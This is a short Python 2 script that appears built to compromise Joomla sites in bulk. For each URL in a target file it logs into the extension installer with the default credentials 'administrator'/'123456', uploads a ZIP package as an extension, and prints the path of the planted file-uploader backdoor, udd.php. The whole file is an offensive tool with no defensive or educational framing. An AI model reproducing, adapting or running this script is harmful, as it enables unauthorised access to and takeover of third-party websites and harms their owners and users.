#!/usr/bin/python

from bs4 import BeautifulSoup
import mechanize, requests
import urllib2 ,urllib

users_file = open("/root/PycharmProjects/untitled/project/scanner/username.txt", "r")
password_file = open("/root/PycharmProjects/untitled/project/scanner/password.txt", "r")
br = mechanize.Browser()
thefile = '/root/scanner/uploader.zip'
thetarget = open('/root/scanner/target2.txt','r')
credintial = open("/root/scanner/credintial.txt")

for i in thetarget.readlines():
    f = i.strip()+ "/index.php?option=com_installer"
    print f
    br2 = br.open(f)


    br.select_form(nr=0)
    br.form["username"] = "administrator"
    br.form["passwd"] = "123456"
    br.submit()
    readingPage = br.response().code
    if readingPage == 200:
      print "login success"

    for form in br.forms():
        print form
    br.select_form(nr=0)
    br.form.set_all_readonly(False)
    br.form["installtype"]="upload"
    br.form.add_file(open(thefile,'r'), 'application/zip', 'uploader.zip')
    br.submit()

    print "the uploader has been upload, and the new url is: " + i.strip() + "\b\b\b\b\b\b\b\b\b\b\b\b\b\bmodules/mod_simplefileuploadv1.3/elements/udd.php"